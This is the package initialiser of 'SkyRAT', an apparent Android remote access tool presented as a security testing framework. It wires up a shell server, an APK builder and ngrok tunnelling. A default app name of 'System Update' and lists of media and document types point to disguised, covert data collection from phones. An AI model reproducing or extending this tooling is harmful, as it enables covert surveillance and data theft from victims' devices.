#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SkyRAT Utils Package
Modular utilities for the SkyRAT Android Security Testing Framework
"""

__version__ = "2.0.0"
__author__ = "Tech Sky - Security Research Team"
__license__ = "MIT (for authorized security research only)"

# Import main classes and functions for easy access
from .server import SkyRATServer, get_shell, print_help, clear_screen
from .builder import SkyRATBuilder, validate_ip, validate_port
from .network import NetworkManager, setup_ngrok, check_internet_connectivity

# Package-level constants
DEFAULT_PORT = 8000
DEFAULT_APP_NAME = "System Update"
SUPPORTED_FORMATS = {
    'audio': ['m4a', '3gp', 'mp4', 'aac'],
    'video': ['mp4', '3gp', 'avi'],
    'image': ['jpg', 'jpeg', 'png', 'gif', 'bmp'],
    'documents': ['pdf', 'doc', 'docx', 'txt', 'rtf']
}

def get_version():
    """Get package version"""
    return __version__

def get_author():
    """Get package author"""
    return __author__

def check_dependencies():
    """Check if all required dependencies are available"""
    dependencies = {
        'pyngrok': False,
        'pathlib': False,
        'xml': False,
        'socket': False,
        'threading': False
    }
    
    # Check pyngrok
    try:
        import pyngrok
        dependencies['pyngrok'] = True
    except ImportError:
        pass
    
    # Check pathlib
    try:
        import pathlib
        dependencies['pathlib'] = True
    except ImportError:
        pass
    
    # Check xml
    try:
        import xml.etree.ElementTree
        dependencies['xml'] = True
    except ImportError:
        pass
    
    # Check socket
    try:
        import socket
        dependencies['socket'] = True
    except ImportError:
        pass
    
    # Check threading
    try:
        import threading
        dependencies['threading'] = True
    except ImportError:
        pass
    
    return dependencies

def print_package_info():
    """Print package information"""
    print(f"""
SkyRAT Utils Package Information:
  Version: {__version__}
  Author: {__author__}
  License: {__license__}
    
Dependencies Status:
""")
    
    deps = check_dependencies()
    for dep, available in deps.items():
        status = "✓ Available" if available else "✗ Missing"
        print(f"  {dep}: {status}")
    
    print(f"""
Supported Formats:
  Audio: {', '.join(SUPPORTED_FORMATS['audio'])}
  Video: {', '.join(SUPPORTED_FORMATS['video'])}
  Images: {', '.join(SUPPORTED_FORMATS['image'])}
  Documents: {', '.join(SUPPORTED_FORMATS['documents'])}
""")

# Module-level utility functions
def create_project_structure(base_path=None):
    """Create the recommended project structure"""
    from pathlib import Path
    
    if base_path is None:
        base_path = Path.cwd()
    else:
        base_path = Path(base_path)
    
    directories = [
        "dumps",
        "build", 
        "tools",
        "docs",
        "examples",
        "android/app/src/main",
        "android/app/src/main/java/com/techsky/skyrat",
        "android/app/src/main/res/layout",
        "android/app/src/main/res/values"
    ]
    
    for directory in directories:
        dir_path = base_path / directory
        dir_path.mkdir(parents=True, exist_ok=True)
        print(f"Created: {dir_path}")
    
    print(f"\nProject structure created at: {base_path}")

# Export main functionality
__all__ = [
    'SkyRATServer',
    'SkyRATBuilder', 
    'NetworkManager',
    'get_shell',
    'setup_ngrok',
    'print_help',
    'clear_screen',
    'validate_ip',
    'validate_port',
    'check_internet_connectivity',
    'get_version',
    'get_author',
    'check_dependencies',
    'print_package_info',
    'create_project_structure',
    'DEFAULT_PORT',
    'DEFAULT_APP_NAME',
    'SUPPORTED_FORMATS'
]